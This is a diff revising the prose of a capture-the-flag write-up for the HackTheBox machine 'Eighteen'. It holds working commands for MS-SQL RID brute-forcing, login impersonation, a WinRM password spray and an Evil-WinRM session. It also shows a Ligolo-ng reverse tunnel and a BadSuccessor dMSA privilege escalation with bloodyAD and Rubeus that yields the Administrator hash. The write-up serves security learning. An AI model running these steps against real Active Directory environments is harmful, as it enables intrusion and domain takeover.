@@ -70,13 +70,13 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Mon Dec 29 11:46:34 2025 -- 1 IP address (1 host up) scanned in 28.05 seconds
 ```
 
-MS-SQL:
+Authenticated to MS-SQL and brute-forced RIDs for usernames:
 
 ```bash
 nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
 ```
 
-usernames:
+The brute force returned a handful of usernames:
 
 ```txt
 jamie.dunn
@@ -88,14 +88,14 @@ carol.white
 dave.green
 ```
 
-Mssql login:
+Logged in interactively with impacket's mssqlclient:
 
 ```bash
 impacket-mssqlclient
 eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.10.11.95
 ```
 
-User `kevin` doesn't have much privilege due to `server principals`:
+User `kevin` doesn't have much privilege of his own — it comes down to `server principals`:
 
 ```sql
 > ?
@@ -105,13 +105,13 @@ User `kevin` doesn't have much privilege due to `server principals`:
 > enum_impersonate
 ```
 
-This command shows that `kevin` can **impersonate** as `appdev`:
+The output shows `kevin` can **impersonate** the `appdev` login:
 
 ```sql
 > exec_as_login appdev
 ```
 
-To switch user.
+`exec_as_login` switches to the impersonated user.
 
 > Note : commands without semi colon are **impacket-inbuild** functions
 
@@ -122,7 +122,7 @@ To switch user.
 > select * from dbo.users;
 ```
 
-Got `pbkdf2` hash
+From there, the `financial_planner` database held a `pbkdf2` hash in the `users` table:
 
 # User Flag
 
@@ -208,11 +208,13 @@ if __name__ == '__main__':
     main()
 ```
 
+The recovered password went into a WinRM spray across all the enumerated usernames:
+
 ```
 nxc winrm 10.10.11.95 -u users.txt -p iloveyou1
 ```
 
-`adam.scott : iloveyou1`
+`adam.scott : iloveyou1` matched, which gave an Evil-WinRM session:
 
 ```
 evil-winrm -i 10.10.11.95 -u adam.scott -p iloveyou1
@@ -226,32 +228,27 @@ Gained **User flag**
 
 https://github.com/SpecterOps/SharpHound/releases
 
-Upload and execute SharpHound.exe
+I uploaded and executed SharpHound.exe on the box.
 
 > Note : Because there no **LDAP service** on the target else we could have used **bloodhound-python** to collect
 
 ### Bloodhound
 
-`adam.scott`
--> a member of IT group
--> no outbound object control
-
-Doesn't have much of privilege
+`adam.scott` turned out to be a member of the IT group with no outbound object control — not much privilege to work with.
 
 ### BloodyAD
 
-This tool can perform specific LDAP calls to a domain controller in order to perform AD priv esc.
+BloodyAD performs targeted LDAP calls against a domain controller in order to escalate privileges in AD:
 https://github.com/CravateRouge/bloodyAD
 
 > Here LDAP service is running internally on local
 
 ### Port Forwarding on Windows
 #### Ligolo-ng
-`version 0.7.5`
+Ligolo-ng `version 0.7.5` handles the tunnel:
 https://github.com/nicocha30/ligolo-ng
 
--> Download a proxy for attacker and agent for victim
--> Here the proxy acts as a listener and agent connects to the proxy from victim
+The proxy runs on the attacker machine as the listener, while the agent on the victim connects back to it.
 
 ```attacker
 ./proxy -selfcert
@@ -276,9 +273,9 @@ ligolo-ng »
 ./agent -connect <attacker-ip>:11601 -ignore-cert
 ```
 
-agent connects back to the listener and a session will be created
+The agent connects back to the listener and a session is created.
 
-select the session using `session` command then use ifconfig to look for the interface available on the victim which will be useful for routing the machines in internal network
+Select the session with the `session` command, then run `ifconfig` to list the interfaces available on the victim — they're what makes routing into the internal network possible.
 
 ```attacker
 ligolo-ng » INFO[4773] Agent joined.   id=1c08fafa-fc2b-4894-af52-41b4b64bbdf4 name="EIGHTEEN\\adam.scott@DC01" remote="10.129.243.211:59584"
@@ -308,9 +305,9 @@ ligolo-ng » session
 └──────────────┴───────────────────────────────┘
 ```
 
-here we just need to perform local port forwarding
+From here it's just local port forwarding.
 
-before tunneling create an interface on attacker_machine:
+Before tunneling, create an interface on the attacker machine:
 
 ```
 sudo ip tuntap add user <current_user> mode tun ligolo  
@@ -318,20 +315,20 @@ sudo ip tuntap add user <current_user> mode tun ligolo
 sudo ip link set ligolo up
 ```
 
-set a route according to mentioned in the documentation:
+Then add a route as the documentation describes:
 
 ```
 sudo ip route add 240.0.0.1/32 dev ligolo 
 ```
 
-now start the tunneling using ligolo:
+With that set, start the tunnel from the Ligolo session:
 
 ```attacker
 [Agent : EIGHTEEN\adam.scott@DC01] » s-tun ligolo
 [Agent : EIGHTEEN\adam.scott@DC01] » INFO[5178] Starting tunnel to EIGHTEEN\adam.scott@DC01 (1c08fafa-fc2b-4894-af52-41b4b64bbdf4)
 ```
 
-Now we can able to access internal ports using `240.0.0.1`
+Internal ports are now reachable through `240.0.0.1`.
 
 ### Back to BloodyAD
 
@@ -347,23 +344,23 @@ permission: CREATE_CHILD
 distinguishedName: CN=adam.scott,OU=Staff,DC=eighteen,DC=htb
 ```
 
-We have **CREATE_CHILD privilege over an OU** (Organizational Unit)
+This gave us **CREATE_CHILD privilege over an OU** (Organizational Unit).
 
 ```
 bloodyAD --host 240.0.0.1 -d eighteen.htb -u 'adam.scott' -p 'iloveyou1' get search --filter "(objectClass=computer)" --attr operatingSystem,operatingSystemVersion 
 ```
 
-it reveals the operation system as **Windows Server 2025** (data center)
+The query reveals the operating system as **Windows Server 2025** (Datacenter).
 
-So this aligns to a specific vulnerability **Badsuccessor**
+That lines up with a specific vulnerability: **Badsuccessor**.
 
 # Badsuccessor
 
 https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
 
-Here we gonna abuse DMSA (Domain Managed Service Account) by creating a new DMSA account with special privilege which acts as a successor of the previous DMSA account (admin) to hijack the admin hash.
+The attack abuses a DMSA (Domain Managed Service Account): we create a new DMSA with special privileges that claims to succeed the previous DMSA account (the admin), which lets us hijack the admin hash.
 
-Reveals the OU, DC, and DC(TLD).
+The reference walks through the setup — the OU, DC, and DC(TLD) come first:
 
 **Reference:**
 https://calledstriker.gitbook.io/blog/security-research/badsuccessor#setup-1
@@ -400,7 +397,7 @@ Verbose: Performing the operation "Set" on target "CN=badpcDMSA,OU=Staff,DC=eigh
 4. Point the dMSA at your target account
 
 ## Rubeus
-built using windows - `version 2.3.3`
+Rubeus was built on Windows — `version 2.3.3`.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\adam.scott\Documents> .\Rubeus.exe hash /password:'Password123@' /user:BADPC$ /domain:eighteen.htb
@@ -410,8 +407,8 @@ built using windows - `version 2.3.3`
 *Evil-WinRM* PS C:\Users\adam.scott\Documents> .\Rubeus.exe asktgs /targetuser:badpcDMSA$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ticket:badpc_tgt.kirbi /outfile:dmsa_tgt.kirbi
 ```
 
-generated Kerberos key material from a password, used it to get a TGT for **`BADPC$`**, and then leveraged that TGT to request a service ticket for **`badpcDMSA$`**. (add previous keys to the output)
+That generated Kerberos key material from a password, used it to request a TGT for **`BADPC$`**, and then leveraged that TGT to request a service ticket for **`badpcDMSA$`** (add the previous keys to the output).
 
-Gained **Administrator** ntlm hash
+Gained the **Administrator** NTLM hash.
 
 Gained `root`
